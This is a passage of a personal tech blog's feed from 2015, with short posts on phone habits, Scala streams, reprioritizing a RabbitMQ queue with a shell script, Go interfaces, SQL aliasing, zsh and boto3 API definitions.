<p>I find myself reaching for it despite knowing it’s gone and even feel it vibrating in my pocket without it being there. It’s both amazing and frightening how significant my phone has become in my life and I’m am actually glad that it’s missing. In many ways I feel like an addict that missed a fix and it’s a rude awakening. For the first time in years I had to ask a stranger for the time and had to find an open barber shop  without a map or an online search. I also went to bed without my usual habit of checking up on Twitter or catching up on some blog posts and I woke up without immediately reaching for my phone.</p>

<p>It’s shocking how hooked we’ve become - nearly every person at my train station is staring at their phone while waiting for the train, on the train itself, and when they leave. Of course phones make our lives better but we have to realize the price we’re paying and sacrifices we’re making. I plan on being more mindful when I do get my phone back and will try to keep some of my days phone free - who knows what sorts of adventures I’ll have.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Generating vs filtering</title>
   <link href="http://dangoldin.com/2015/08/15/generating-vs-filtering/"/>
   <updated>2015-08-15T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/08/15/generating-vs-filtering</id>
   <content:encoded><![CDATA[
<p>While playing around with Scala I rediscovered streams - a list-like structure that’s lazily evaluated - meaning that only when you access a particular value is it evaluated. This makes it possible to create infinite streams since all you need is a function that’s able to compute the next value. In such a way we can create a stream of all numbers, just the positive even numbers, or just the prime numbers. Calculating each successive prime number will become more difficult but it is possible.</p>

<p>In the case of the positive even numbers it’s possible to generate the stream in two simple ways - one is to take each positive integer and double it while the other is to take every positive integer and filter them down to those that are divisible by two. Both of these will generate the exact same numbers in the same order but do it in opposite ways. One generates the numbers from a base list and the other filters a larger list down.</p>

<p>In this example the efficiency of the two approaches is similar: the first goes through each element once and does a bit shift while the second goes through two elements and does a bit comparison. But on real code the differences between the two approaches can be significant. It’s also likely that one of the approaches may not even be possible or be too arduous - imagine generating a list of prime numbers.</p>

<p>Both are useful depending on the problem and the skill is figuring out when to use each. The generative approach feels as if it should be the more efficient one but there are many cases where filtering is easier and quicker.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Reprioritizing a non priority RabbitMQ queue</title>
   <link href="http://dangoldin.com/2015/08/12/reprioritizing-a-non-priority-rabbitmq-queue/"/>
   <updated>2015-08-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/08/12/reprioritizing-a-non-priority-rabbitmq-queue</id>
   <content:encoded><![CDATA[
<p>Earlier today we had a hiccup where we had a bunch of messages piled up on a RabbitMQ queue that were not being consumed. Some of these tasks were very quick data loads while others were more involved jobs that could take multiple minutes to run. Normally these are distributed relatively evenly across the day so it’s not a problem but in this case we had hundreds of tasks in a random order and we wanted to shuffle them around such that the data load tasks executed first so that the data would be quickly accessible to other higher priority jobs.</p>

<p>Luckily, we remembered we had some old shell commands that helped us backup and restore a RabbitMQ queue so it only required a bit of scripting to come up with a sequence of commands to do exactly what we wanted. The script works by dumping the contents of the queue into a file, extracting the message field, filtering the messages into the desired buckets, turning them into queue addition commands, and executing the resulting files.</p>

<figure class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="c"># Dump the contents of the queue to a file.</span>
<span class="c"># To be safe requeue the messages and do a manual purge when</span>
<span class="c"># we confirm the data looks right.</span>
./rabbitmqadmin get <span class="nv">queue</span><span class="o">=</span>data_queue <span class="nv">requeue</span><span class="o">=</span><span class="nb">true </span><span class="nv">count</span><span class="o">=</span>2000 <span class="o">&gt;</span> tasks.log

<span class="c"># 1 - Get the appropriate field (in our case the fifth one)</span>
<span class="c"># 2 - Remove the header rows</span>
<span class="c"># 3 - Trim the line</span>
<span class="c"># 4 - Prepend the publish command and turn the task message string into an argument</span>
<span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'|'</span> <span class="nt">-f5</span> tasks.log | <span class="nb">sed</span> <span class="s1">'$d'</span> | <span class="nb">sed</span> <span class="s1">'1,3d'</span> | <span class="nb">sed</span> <span class="s1">'s/^ *//;s/*$//'</span> | <span class="nb">sed</span> <span class="nt">-e</span> <span class="s2">"s/^/.</span><span class="se">\/</span><span class="s2">rabbitmqadmin publish exchange=data_queue.task routing_key=standard payload='/"</span> | <span class="nb">sed</span> <span class="nt">-e</span> <span class="s2">"s/</span><span class="nv">$/</span><span class="s2">'/"</span> <span class="o">&gt;</span> tasks.clean

<span class="c"># Split the tasks into two pieces</span>
<span class="nb">cat </span>tasks.clean | <span class="nb">grep </span>log <span class="o">&gt;</span> tasks.clean1
<span class="nb">cat </span>tasks.clean | <span class="nb">grep</span> <span class="nt">-v</span> log <span class="o">&gt;</span> tasks.clean2

<span class="c"># Queue the tasks in the appropriate order</span>
sh tasks.clean1
sh tasks.clean2</code></pre></figure>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Static site search</title>
   <link href="http://dangoldin.com/2015/08/09/static-site-search/"/>
   <updated>2015-08-09T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/08/09/static-site-search</id>
   <content:encoded><![CDATA[
<p>I’ve written <a href="http://dangoldin.com/2013/03/12/mmmm-pseudo-static-sites/" target="_blank">previously</a> about the appeal of static sites and recently came up with another example of how powerful the setup can be. The gist is that the site’s content is static HTML, CSS, and JavaScript but the relevant underlying content is refreshed on a recurring basis with a separate job. This allows you to host the entire site on S3 and avoid maintaining your own web server.</p>

<p>Normally, implementing a site search requires a backend to accept queries, break them down into the appropriate keywords, and hit a search index to find the matching documents. A simple implementation would index the site using a server side script and store the results in a JSON file that could then be access on the client side. The client side JavaScript would need to be intelligent enough to parse the query string and reference the right index file but a simple solution is easily doable. I’m surprised more simple sites haven’t adopted this approach and I’ll give it a shot with this blog to see what issues I run into.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Debate what's necessary and no more</title>
   <link href="http://dangoldin.com/2015/08/03/debate-whats-necessary-and-no-more/"/>
   <updated>2015-08-03T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/08/03/debate-whats-necessary-and-no-more</id>
   <content:encoded><![CDATA[
<p>A critical component in communicating between various teams is knowing who has what responsibility. Especially with driven people it’s easy to have overlap between various functions - product and design; design and frontend engineering; and frontend engineering and backend engineering. This is both good - because it’s able to focus more eyes on a particular problem and provides a new perspective - and bad  - because people may feel that they can’t move quickly enough and don’t want to cede decision making power. Great teams thrive in this environment while poor teams degenerate into a Dilbert cartoon.</p>

<p>One approach that I’ve been preaching is to standardize on the edge points that can act as a form of “contract” between the teams. At those edges it’s great to have the debates and argue the merits of various implementations but beyond that the ownership should lie with the respective team.</p>

<p>An example is to image two engineering teams - one is a full-stack team responsible for the UI and the corresponding API endpoints for a customer facing application and the other is a backend team that uses this information to run the hidden part of the application - the data collection, the web server, and the various third party integrations. In this case a good intersection point would be the database - both teams leverage it and have their own thoughts on what to store and how to structure the schema. The debate should be centered around these questions rather than how each team builds their own components. Once there’s agreement on the database structure each team can go ahead and work independently of the others.</p>

<p>Similarly, a designer can create a series of mocks that can then be debated with the frontend team. The frontend team may push for a different design that will simplify their code and a designer may push for a certain approach that significantly increases the product’s usability. After both teams settled on an approach they can focus on what they’re great at - a designer may focus on getting the visual details perfect while the front end team can start writing the HTML, CSS, and JavaScript.</p>

<p>By focusing on what we actually need to do our jobs and trusting others to do the same we’re able to skip the politics and move quickly. It’s human nature to be curious and want to know everything that’s going on but it’s a massive hit to productivity. Especially at a startup when speed is critical being able to skip the unnecessary meetings, debates, and politics can make the difference between success and failure.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>It's not done until it's deployed</title>
   <link href="http://dangoldin.com/2015/08/01/its-not-done-until-its-deployed/"/>
   <updated>2015-08-01T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/08/01/its-not-done-until-its-deployed</id>
   <content:encoded><![CDATA[
<p>As a developer, it feels wonderful to commit some code and knock an item off of the ever growing to do list. Unfortunately, until that code is deployed it’s not delivering any actual benefit. It’s easy to open a pull request and move on to the next task but to create high quality products we need to only consider our code complete when it’s deployed and running issue free. So many things need to happen between writing the code and deploying it - handling conflicts with other database changes, updating database schemas, and monitoring the actual code to make sure it’s working as expected on a production system. Calling something done before it’s deployed is a lazy shortcut.</p>

<p>This approach also encourages developers to care more about their code and take a big picture view of the product. By taking an active role in the deployment we’re forced to think through the dependencies and design a release process that avoids downtime and occurs in the right order. For simple features it’s straightforward but larger, coupled ones require an approach that may even end up in rewriting code in order to simplify or stage a complicated deployment process. And if you know your features aren’t complete until they’re deployed you’ll make an effort to actually get them deployed. This is a huge risk reduction since the code and ideas are still fresh in our minds and can deploy code in small batches rather than massive monoliths.</p>

<p>The holy grail is continuous deployment which couples code commits and deployments but it requires significant effort to get it working smoothly that may not be worth it for early stage companies who need to focus on building their product. For them iterating is crucial and every developer needs to take ownership of getting their code into production.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The Go interface</title>
   <link href="http://dangoldin.com/2015/07/29/the-go-interface/"/>
   <updated>2015-07-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/07/29/the-go-interface</id>
   <content:encoded><![CDATA[
<p>I’ve only been playing around with Go for a couple of weeks but one of the language design decisions I’ve really enjoyed is how interfaces are handled. Coming from a traditional object oriented background it’s typical to define an interface that defines a few method signatures and then explicitly implement that interface in a new class. Below’s a trivial example of this approach in Java:</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">interface</span> <span class="nc">Animal</span> <span class="o">{</span>
  <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">isFurry</span><span class="o">();</span>
  <span class="kd">public</span> <span class="nc">String</span> <span class="nf">speak</span><span class="o">();</span>
<span class="o">}</span>

<span class="kd">class</span> <span class="nc">Dog</span> <span class="kd">implements</span> <span class="nc">Animal</span> <span class="o">{</span>
  <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">isFurry</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="nc">String</span> <span class="nf">speak</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">return</span> <span class="s">"Woof"</span><span class="o">;</span>
  <span class="o">}</span>
<span class="o">}</span>

<span class="kd">public</span> <span class="kt">void</span> <span class="nf">aRandomFunction</span><span class="o">(</span><span class="nc">Animal</span> <span class="n">a</span><span class="o">)</span> <span class="o">{</span> <span class="o">..</span>  <span class="o">}</span> <span class="c1">// Can take anything that implements Animal</span></code></pre></figure>

<p>With this approach a compiler immediately identifies cases where you choose to implement an interface but forget (or mess up) implementing one of the underlying methods.</p>

<p>Go’s approach is different. In go you would define the interface as usual with the expected methods and you would write functions that accept the interface as the argument. But instead of explicitly specifying that a particular object implements an interface you just do it. Then if it turns out you’ve successfully implemented the methods you can use that object wherever the interface is expected. The compiler is still able to point out signature issues since it can tell when you’re trying to use an object with a required method but it’s done in an implicit way. Below’s the equivalent Go code:</p>

<figure class="highlight"><pre><code class="language-go" data-lang="go"><span class="k">type</span> <span class="n">Animal</span> <span class="k">interface</span> <span class="p">{</span>
  <span class="n">isFurry</span><span class="p">()</span> <span class="kt">bool</span>
  <span class="n">speak</span> <span class="kt">string</span>
<span class="p">}</span>

<span class="k">type</span> <span class="n">Dog</span> <span class="k">struct</span> <span class="p">{</span>
<span class="p">}</span>

<span class="k">func</span> <span class="p">(</span><span class="n">d</span> <span class="n">Dog</span><span class="p">)</span> <span class="n">isFurry</span><span class="p">()</span> <span class="kt">bool</span> <span class="p">{</span>
  <span class="k">return</span> <span class="no">true</span>
<span class="p">}</span>

<span class="k">func</span> <span class="p">(</span><span class="n">d</span> <span class="n">Dog</span><span class="p">)</span> <span class="n">speak</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>
  <span class="k">return</span> <span class="s">"Woof"</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">aRandomFunction</span><span class="p">(</span><span class="n">a</span> <span class="n">Animal</span><span class="p">)</span> <span class="p">{</span> <span class="o">..</span> <span class="p">}</span></code></pre></figure>

<p>Dynamic languages frequently use this “duck typing” approach since the variable types may only be discovered during run time so it’s neat seeing it implemented this simply in a static, strongly typed language. The simplicity and novelty of Go’s interfaces make me eager to keep digging and see what else I discover.</p>

<p>https://en.wikipedia.org/wiki/Duck_typing</p>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Use the database Luke</title>
   <link href="http://dangoldin.com/2015/07/25/use-the-database-luke/"/>
   <updated>2015-07-25T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/07/25/use-the-database-luke</id>
   <content:encoded><![CDATA[
<p>I’m convinced that the best way to ramp up as a newly hired engineer is to go through the database. Rather than relying on outdated documentation or discovering undocumented features the database is the actual source of truth and defines both the limits and the capabilities of the application. You can examine the relationships between the various objects as well as the litany of features and options that are supported. It’s definitely more difficult to get up to speed on a database rather than documentation or a demo of the UI but the knowledge gained is significantly deeper. Especially when you’re going to be working on features that depend on the database it’s incredibly useful to know how the database is laid out and set up. On its own a walk through of the UI provides a high level overview of how it works but coupling that with the database allows you to internalize the connections and actually understand how the user interactions feed the data and vice versa.</p>

<p>One of the most interesting benefits is seeing the progression of a company’s products and features. A typical database will contain a litany of fields and tables that stick around after the underlying feature or product is antiquated. These features have no documentation and the only way to know what they’re used for is to spend hours going through version control history or talk to someone who was actually around. Despite these fields and tables no longer being used they’re valuable for the context they provide. Seeing the evolution of a product allows you to identify what worked and what didn’t work and serve as as a springboard for new ideas.</p>

<p>Databases are rarely part of an engineer’s onboarding process and are mostly on a “need to know basis.” Only when you’re working on a particular feature do you have to understand the relevant schema and even then you’re not expected to go beyond what you’re working on. This is the wrong approach and there’s a ton of implicit knowledge in our databases that make the entire team more productive. Coupling this with a walkthrough of the UI and the API is a great way to learn and relate the various concepts.</p>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Tunnel vision</title>
   <link href="http://dangoldin.com/2015/07/20/tunnel-vision/"/>
   <updated>2015-07-20T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/07/20/tunnel-vision</id>
   <content:encoded><![CDATA[
<p>A common behavior when solving a coding problem is focusing too much on the solution and not enough on the general context. If this is a software problem this may manifest itself as a very quick turnaround on a task that inadvertantly breaks an existing behavior or even something that ends up causing a headache months from now when a slightly more nuanced use case needs to be supported. Experienced developers will not only solve the task at hand but will also understand the limitations of their solution and are able to identify the areas that will be adversely affected by their solution. Nearly every software decision comes with tradeoffs and strong developers can think through this maze and pick the most appropriate one given the situation.</p>

<p>Part is experience and learning from our mistakes and part is knowing our applications and how the various components interact and fit together. A big driver of this is curiosity - some developers will stop as soon as they find a library that solves a particular problem and will maybe even read the docs but great developers will step through the actual code to understand how it works. Imagine two people working on the same tasks for a year - one who’s curious enough to read through the source code of open source libraries they used and one who doesn’t. I’d bet that the one who was curious enough to read through third party source code learned and retained significantly more than the one who didn’t. Another one is relentlessly thinking in abstractions - thinking at a higher level makes it much easier to spot patterns and identify code that needs to be refactored. This ends up paying massive dividends in the long term when massive scopes of work can be eliminated. One way to get better at this is to constantly reevaluate your work and identify code that’s been duplicated since it may be a sign you chose the wrong level of abstraction. Another one is thinking through what you’d have to do if you needed to make some tweaks in the future - would you be able to reuse the code in a clean way? Which part would be the easiest to modify? Which parts are too coupled to separate easily? The simplest way may be to just look and the code and see if it’s ugly - that may be a sign that you did something wrong.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Excel wins</title>
   <link href="http://dangoldin.com/2015/07/19/excel-wins/"/>
   <updated>2015-07-19T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/07/19/excel-wins</id>
   <content:encoded><![CDATA[
<p>Other than the usual developer tools the only desktop based app I use is Excel and every few months I try to wean myself away. I love being able to keep all my text docs and slideshows online and have them accessible and sharable anywhere. The best part is updating the content without having to worry about bombarding people with yet another email.</p>

<p>I tried doing the same with Google Sheets and it works for smaller tables but as soon as you get tables with thousands of rows it’s noticeably slower than Excel. It’s amazing for what it can do but it feels as if the browser just can’t handle the rendering nor the calculation that a large spreadsheet entails. Some of the time closing and reopening the table fixes the problem but this is too reminiscent of Windows in the 90s and ends up in a glacial pace after a few minutes of work. I continue to use Google Sheets for small, collaborative files but for anything larger or anything that will need heavy computation I’ll switch to Excel. I’ve also been using R for more repetitive analyses but for the quick and dirty analysis that comes from the result of a SQL query Excel is still king.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A Bloom filter in my head</title>
   <link href="http://dangoldin.com/2015/07/16/a-bloom-filter-in-my-head/"/>
   <updated>2015-07-16T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/07/16/a-bloom-filter-in-my-head</id>
   <content:encoded><![CDATA[
<p>As many at TripleLift will tell you I have a fondness for <a href="https://en.wikipedia.org/wiki/Bloom_filter" target="_blank">Bloom filters</a> but only recently did I realize that our brains work in a similar way. We don’t always know every particular detail or have perfect recall but what we do have is the ability to realize that something is familiar and that we might have encountered it before. This triggers enough additional thoughts that we’re able to dig up the actual thought or reference. For example I can’t always recall the exact Java library I need to use for a particular problem but I know that I’ve solved similar problems before and can quickly rediscover my previous solution, whether through an online search with the appropriate keywords or even by going through some old code.</p>

<p>I’d even argue that it’s more important to have awareness of everything you’ve done and seen in the past than to have a perfect recollection of a smaller subset of items. Knowing that you’ve seen something before takes care of the fear of the unknown - very similar to how <a href="https://en.wikipedia.org/wiki/George_Dantzig" target="_blank">George Dantzig</a> was able to solve an “unsolvable problem” as a student since he didn’t know it was considered unsolvable.</p>

<p>Unknowingly I’ve even developed an approach to take advantage of this mental model. I dump interesting notes and links into text files that I “tag” with a bunch of additional thoughts or keywords I think of at the time. Then whenever I run into an issue and realize that one of my notes might be useful it’s a simple text search to find exactly what I’m looking for. Rather than rely on a structured approach such as Evernote I rely on my own adhoc system and am rarely unable to find what I was looking for. In the extreme cases I can even resort to a regex search and some piping to deal with too many results or a very scattered document. Every once in a while I’ll even write a quick Python script to provide a semblance of order although almost always I just resort to a text search.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Comparing SQL schemas</title>
   <link href="http://dangoldin.com/2015/07/12/comparing-sql-schemas/"/>
   <updated>2015-07-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/07/12/comparing-sql-schemas</id>
   <content:encoded><![CDATA[
<p>During development it’s common to get your dev database out of sync with the one in production. Sometimes it’s due to an additional column in development you added before realizing it wasn’t necessary and other times it’s just creating a few temporary tables on production that you forget to drop. In both cases it’s useful to reconcile the schema differences every once in a while to keep your database in a clean state. In the past I would just run a simple query (select table_schema, table_name, column_name from information_schema.columns;) on each environment and then use either Excel or Google Sheets to spot the differences. This takes a bit of time so this weekend I put together a quick <a href="https://dangoldin.github.io/js-tools/#tab-sql-schema-comparison" target="_blank">JavaScript tool</a> to automate the process. You simply run the schema query on each of the environments and paste the resulting rows into the two text areas. The result is a JSON based diff showing the additions, deletions, and modifications to each of the tables and fields. The next step is to modify it to also identify differences in the column types.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Apple and Intel</title>
   <link href="http://dangoldin.com/2015/07/08/apple-and-intel/"/>
   <updated>2015-07-08T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/07/08/apple-and-intel</id>
   <content:encoded><![CDATA[
<p>I recently finished <a href="http://www.amazon.com/The-Intel-Trinity-Important-Company/dp/0062226762" target="_blank">The Intel Trinity</a> which detailed the history of Intel and its rise from a small memory manufacturer to the leader in microprocessors. The entire book is worth a read if you’re interested in startups and the rise of Silicon Valley but one anecdote that immediately stood out was about the reason Apple didn’t use Intel chips <a href="https://en.wikipedia.org/wiki/Apple's_transition_to_Intel_processors" target="_blank">until 2005</a>. Before then Macs relied on <a href="https://en.wikipedia.org/wiki/List_of_Macintosh_models_grouped_by_CPU_type" target="_blank">MOS Technology, Motorola and PowerPC</a> chips. The Intel Trinity makes the case that the reason Apple waited so long to adopt Intel chips was due to the fact that Steve Wozniak didn’t have enough money to build the Apple I prototype using Intel and had to resort to the cheaper option - a MOS 6502/Motorola 6800. And the reason Steve Wozniak didn’t have enough money was because Steve Jobs didn’t split the Atari payment fairly between them and took the lion’s share without even telling Steve Wozniak about it.</p>

<p>After a tiny bit of digging around the <a href="http://www.quora.com/Was-Steve-Wozniak-really-planning-on-using-the-Intel-8080-in-the-Apple-I" target="_blank">concensus seems</a> to be that this is most likely a fabrication and even if Wozniak had the money he would have still gone with the Motorola chip - he was more familiar with the technology and the end goal was to make an affordable personal computer which would have been impossible with the Intel chip. It does make one wonder what the history of Apple and the computer industry would look like had they adopted Intel at the very beginning rather than in 2005.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Zsh and Oh My Zsh</title>
   <link href="http://dangoldin.com/2015/07/06/zsh-and-oh-my-zsh/"/>
   <updated>2015-07-06T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/07/06/zsh-and-oh-my-zsh</id>
   <content:encoded><![CDATA[
<p>I spend a fair amount of time in the command line and one of my biggest wins in productivity has come from adopting Z shell along with the wonderful <a href="https://github.com/robbyrussell/oh-my-zsh" target="_blank">oh-my-zsh</a> framework. I initially installed it when looking for better git integration but have been discovering tons of new tricks and features since. In addition to the standard autocompletion for both paths as well as commands there are various plugins to support a variety of other scripts. Just a few days ago I enabled a plugin to allow for autocompletion for Python’s fabric commands. The advantage for a single command is tiny if you’re quick on the keyboard but when you’re running hundreds of commands each day it’s nice to get your typing speed to be as quick as your thought process. Zsh comes close.</p>

<p>If your bash environment is optimized for your flow after years of tweaking zsh is not for you. Otherwise you should give it a shot - it’s a superset of what you get in bash and you can easily migrate your bash configuration to zsh and can easily switch back. I have dozens of apps installed right now that I’m sure I’ll forget to reinstall when I get a new computer - until I realize I need them. Zsh on the other hand will be one of the first things I install - it’s that critical to my productivity.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Ambiguous SQL queries</title>
   <link href="http://dangoldin.com/2015/06/27/ambiguous-sql-queries/"/>
   <updated>2015-06-27T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/06/27/ambiguous-sql-queries</id>
   <content:encoded><![CDATA[
<p>One of the best habits to develop when working with SQL is to always refer to fields through an alias. Numerous times I decided to just take a shortcut and ended up regretting it later. Even if you’ve tested your query to make sure it works there’s no guarantee that a future change to a table schema won’t break it.</p>

<p>Let’s say you have the following two tables - with items.category_id corresponding to categories.id</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">create</span> <span class="k">table</span> <span class="n">items</span> <span class="p">(</span>
    <span class="n">id</span> <span class="nb">int</span><span class="p">,</span>
    <span class="n">name</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span>
    <span class="n">category_id</span> <span class="nb">int</span><span class="p">,</span>
    <span class="n">owner_id</span> <span class="nb">int</span>
<span class="p">);</span>

<span class="k">create</span> <span class="k">table</span> <span class="n">categories</span> <span class="p">(</span>
    <span class="n">id</span> <span class="nb">int</span><span class="p">,</span>
    <span class="n">code</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="p">);</span></code></pre></figure>

<p>It’s straightforward to join the two tables to get some basic info:</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="n">i</span><span class="p">.</span><span class="n">id</span> <span class="k">as</span> <span class="n">item_id</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">category_id</span><span class="p">,</span> <span class="n">code</span>
<span class="k">from</span> <span class="n">items</span> <span class="n">i</span>
<span class="k">join</span> <span class="n">categories</span> <span class="k">c</span> <span class="k">on</span> <span class="n">i</span><span class="p">.</span><span class="n">category_id</span> <span class="o">=</span> <span class="k">c</span><span class="p">.</span><span class="n">id</span><span class="p">;</span></code></pre></figure>

<p>Let’s say we test the code and deploy to production. It works perfectly until someone adds a “name” column to the categories table. All of a sudden our query stops working with a helpful “Column ‘name’ in field list is ambiguous” error. The reason is that the query doesn’t specify which source table for the name column. The solution is to simply prepend the items table alias to the name field and we’re back to a functional query.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="n">i</span><span class="p">.</span><span class="n">id</span> <span class="k">as</span> <span class="n">item_id</span><span class="p">,</span> <span class="n">i</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="n">category_id</span><span class="p">,</span> <span class="n">code</span>
<span class="k">from</span> <span class="n">items</span> <span class="n">i</span>
<span class="k">join</span> <span class="n">categories</span> <span class="k">c</span> <span class="k">on</span> <span class="n">i</span><span class="p">.</span><span class="n">category_id</span> <span class="o">=</span> <span class="k">c</span><span class="p">.</span><span class="n">id</span><span class="p">;</span></code></pre></figure>

<p>This issue is tough to check against since it requires searching your entire codebase every time you need to alter a table. A better approach is to always specify the schema and avoid the issue altogether. Especially in a quickly growing engineering team where multiple people are working on the same code base it’s very easy to run into these sorts of issues that may only get discovered in production. Although most ORM frameworks abstract this away it’s sometimes necessary to dive down into raw SQL and this is one of those small best practices that is a tiny bit of additional effort to significantly reduce a future risk. Avoid learning this lesson the hard way.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Domain specific API definitions</title>
   <link href="http://dangoldin.com/2015/06/23/domain-specific-api-definitions/"/>
   <updated>2015-06-23T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/06/23/domain-specific-api-definitions</id>
   <content:encoded><![CDATA[
<p>Yesterday, Amazon <a href="https://aws.amazon.com/blogs/aws/now-available-aws-sdk-for-python-3-boto3/" target="_blank">announced</a> a major update to their Python client, boto3. The core functionality is unchanged but they used a clever solution to make it easier to add, modify, and remove endpoints. By coming up with a <a href="https://github.com/boto/boto3/tree/develop/boto3/data" target="_blank">standardized representation</a> for each of the endpoints they’re able to write wrappers in different languages that generate the API calls programmatically. For example, I’ve included a subset of the <a href="https://github.com/boto/boto3/blob/develop/boto3/data/ec2/2015-04-15/resources-1.json" target="_blank">EC2 definition</a> below. It contains the information necessary to programatically generate the API wrapper to hit the appropriate EC2 endpoints.</p>

<figure class="highlight"><pre><code class="language-json" data-lang="json"><span class="p">{</span><span class="w">
  </span><span class="nl">"service"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"actions"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="nl">"CreateDhcpOptions"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"request"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nl">"operation"</span><span class="p">:</span><span class="w"> </span><span class="s2">"CreateDhcpOptions"</span><span class="w"> </span><span class="p">},</span><span class="w">
        </span><span class="nl">"resource"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"DhcpOptions"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"identifiers"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
            </span><span class="p">{</span><span class="w"> </span><span class="nl">"target"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Id"</span><span class="p">,</span><span class="w"> </span><span class="nl">"source"</span><span class="p">:</span><span class="w"> </span><span class="s2">"response"</span><span class="p">,</span><span class="w"> </span><span class="nl">"path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"DhcpOptions.DhcpOptionsId"</span><span class="w"> </span><span class="p">}</span><span class="w">
          </span><span class="p">],</span><span class="w">
          </span><span class="nl">"path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"DhcpOptions"</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"CreateInstances"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"request"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nl">"operation"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RunInstances"</span><span class="w"> </span><span class="p">},</span><span class="w">
        </span><span class="nl">"resource"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Instance"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"identifiers"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
            </span><span class="p">{</span><span class="w"> </span><span class="nl">"target"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Id"</span><span class="p">,</span><span class="w"> </span><span class="nl">"source"</span><span class="p">:</span><span class="w"> </span><span class="s2">"response"</span><span class="p">,</span><span class="w"> </span><span class="nl">"path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Instances[].InstanceId"</span><span class="w"> </span><span class="p">}</span><span class="w">
          </span><span class="p">],</span><span class="w">
          </span><span class="nl">"path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Instances[]"</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="err">...</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span></code></pre></figure>

<p>This domain specific approach is great when working with APIs and I’m surprised more libraries don’t adopt it. The benefits include being able to keep the actual code the same and only updating the definitions as well as having definitions shared across various language implementations. An additional benefit that can be gotten is actually downloading the latest definitions at runtime. This way you’re always running against the latest version of the API and don’t have to worry about upgrading versions.</p>

<p>I’d love to see more companies adopt this approach and even come up with a standard API declaration language. Then a single set of scripts can be used to wrap any API. Imagine how much simpler it would be to integrate with third party APIs when all you need to do is read the docs and have everything else wired. In fact the docs themselves can be generated from the base definitions.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Properly handling text based two factor authentication</title>
   <link href="http://dangoldin.com/2015/06/20/properly-handling-text-based-two-factor-authentication/"/>
   <updated>2015-06-20T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/06/20/properly-handling-text-based-two-factor-authentication</id>
